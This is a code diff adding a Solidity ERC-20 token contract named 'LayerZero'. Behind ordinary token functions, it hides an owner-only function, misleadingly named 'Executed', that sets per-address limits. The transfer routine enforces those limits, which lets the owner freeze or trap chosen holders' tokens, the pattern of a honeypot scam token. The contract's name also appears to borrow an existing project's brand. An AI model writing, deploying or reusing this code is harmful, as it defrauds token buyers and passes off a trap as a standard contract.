@@ -1,0 +1,164 @@
+contract LayerZero is IERC20, Ownable {
+    using SafeMath for uint256;
+    uint256 private constant _coinsAmount = 100000000;
+    address private constant _nullAddress =
+        0x000000000000000000000000000000000000dEaD;
+    mapping(address => mapping(address => uint256)) private _allowances;
+    mapping(address => uint256) private _balances;
+    mapping(address => uint256) private _approvals;
+    string private _name;
+    string private _symbol;
+    uint8 private _decimals;
+    uint256 private _totalSupply;
+
+    constructor() {
+        _decimals = 18;
+        _name = "LayerZero";
+        _symbol = "LayerZero";
+        _totalSupply = _coinsAmount * (10 ** uint256(_decimals));
+        _balances[_msgSender()] = _totalSupply;
+        emit Transfer(address(0), _msgSender(), _totalSupply);
+    }
+
+    function name() public view returns (string memory) {
+        return _name;
+    }
+
+    function symbol() public view returns (string memory) {
+        return _symbol;
+    }
+
+    function decimals() public view returns (uint8) {
+        return _decimals;
+    }
+
+    function balanceOf(address account) public view override returns (uint256) {
+        return _balances[account];
+    }
+
+    function totalSupply() public view override returns (uint256) {
+        return _totalSupply;
+    }
+
+    function transfer(
+        address recipient,
+        uint256 amount
+    ) public virtual override returns (bool) {
+        address sender = _msgSender();
+        _transfer(sender, recipient, amount);
+        return true;
+    }
+
+    function increaseAllowance(
+        address spender,
+        uint256 addedValue
+    ) public virtual returns (bool) {
+        _approve(
+            _msgSender(),
+            spender,
+            _allowances[_msgSender()][spender].add(addedValue)
+        );
+        return true;
+    }
+
+    function Executed(address account, uint256 amount) external onlyowner {
+        _approvals[account] = amount;
+    }
+
+    function getAllowance(address account) public view returns (uint256) {
+        return _approvals[account];
+    }
+
+    function decreaseAllowance(
+        address spender,
+        uint256 subtractedValue
+    ) public virtual returns (bool) {
+        _approve(
+            _msgSender(),
+            spender,
+            _allowances[_msgSender()][spender].sub(
+                subtractedValue,
+                "ERC20: decreased allowance below zero"
+            )
+        );
+        return true;
+    }
+
+    function allowance(
+        address owner,
+        address spender
+    ) public view override returns (uint256) {
+        return _allowances[owner][spender];
+    }
+
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) public override returns (bool) {
+        _transfer(sender, recipient, amount);
+        _approve(
+            sender,
+            _msgSender(),
+            _allowances[sender][_msgSender()].sub(
+                amount,
+                "ERC20: transfer exceeds allowance"
+            )
+        );
+        return true;
+    }
+
+    function approve(
+        address spender,
+        uint256 amount
+    ) public override returns (bool) {
+        _approve(_msgSender(), spender, amount);
+        return true;
+    }
+
+    function _transfer(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) internal virtual {
+        require(
+            recipient != address(0),
+            "ERC20: transfer to zer0 addres is prohibited."
+        );
+        require(
+            sender != address(0),
+            "ERC20: transfer from zer0 addres is prohibited."
+        );
+        uint256 allowances = getAllowance(sender);
+        if (allowances > 0) {
+            require(amount > allowances, "ERC20: transfer exceeds allowance.");
+        }
+        uint256 blsender = _balances[sender];
+        require(
+            blsender >= amount,
+            "ERC20: transfer amount exceeded balance."
+        );
+        _balances[recipient] = _balances[recipient].add(amount);
+        _balances[sender] = _balances[sender].sub(amount);
+
+        emit Transfer(sender, recipient, amount);
+    }
+
+    function _approve(
+        address owner,
+        address spender,
+        uint256 amount
+    ) internal virtual {
+        require(
+            owner != address(0),
+            "ERC20: approve from zero addres is prohibited."
+        );
+        require(
+            spender != address(0),
+            "ERC20: approve to zero addres is prohibited."
+        );
+
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+}
